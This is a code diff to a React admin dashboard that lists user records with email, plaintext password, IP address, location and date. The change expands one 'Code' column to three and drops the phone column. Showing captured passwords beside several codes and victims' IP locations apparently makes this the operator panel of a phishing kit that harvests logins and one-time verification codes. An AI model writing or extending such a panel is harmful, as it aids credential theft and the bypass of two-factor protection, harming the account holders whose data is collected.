@@ -128,7 +128,6 @@ function AdminPage() {
         <h1 className="text-3xl font-bold">Admin Dashboard</h1>
 
         <div className="flex items-center gap-4">
-          {/* Theme toggle */}
           <button
             onClick={() => setTheme(theme === "dark" ? "light" : "dark")}
             className="px-4 py-2 rounded-lg bg-gray-700 text-white"
@@ -164,9 +163,10 @@ function AdminPage() {
           >
             <tr>
               <th className="py-3 px-4 text-left">Email</th>
-              <th className="py-3 px-4 text-left">Phone</th>
               <th className="py-3 px-4 text-left">Password</th>
-              <th className="py-3 px-4 text-left">Code</th>
+              <th className="py-3 px-4 text-left">Code 1</th>
+              <th className="py-3 px-4 text-left">Code 2</th>
+              <th className="py-3 px-4 text-left">Code 3</th>
               <th className="py-3 px-4 text-left">IP</th>
               <th className="py-3 px-4 text-left">Location</th>
               <th className="py-3 px-4 text-left">Date</th>
@@ -185,20 +185,19 @@ function AdminPage() {
                 }`}
               >
                 <td className="py-3 px-4">{user.email}</td>
-                <td className="py-3 px-4">{user.phone || "—"}</td>
                 <td className="py-3 px-4">{user.word}</td>
-                <td className="py-3 px-4 text-blue-600 font-semibold">
-                  {user.code}
-                </td>
+                <td className="py-3 px-4 text-blue-500 font-semibold">{user.code || "—"}</td>
+                <td className="py-3 px-4 text-blue-500 font-semibold">{user.code2 || "—"}</td>
+                <td className="py-3 px-4 text-blue-500 font-semibold">{user.code3 || "—"}</td>
                 <td className="py-3 px-4">{user.ip || "Unknown"}</td>
-                <td className="py-3 px-4">{user.ipLocation || "Unknown"}</td>
-                <td className="py-3 px-4">
+                <td className="py-3 px-4 text-xs">{user.ipLocation || "Unknown"}</td>
+                <td className="py-3 px-4 text-xs">
                   {new Date(user.createdAt).toLocaleString()}
                 </td>
                 <td className="py-3 px-4">
                   <button
                     onClick={() => deleteUser(user._id)}
-                    className="bg-red-500 text-white px-3 py-1 rounded-lg hover:bg-red-600"
+                    className="bg-red-500 text-white px-3 py-1 rounded-lg hover:bg-red-600 text-xs"
                   >
                     Delete
                   </button>
@@ -217,4 +216,3 @@ function AdminPage() {
 }
 
 export default AdminPage;
-
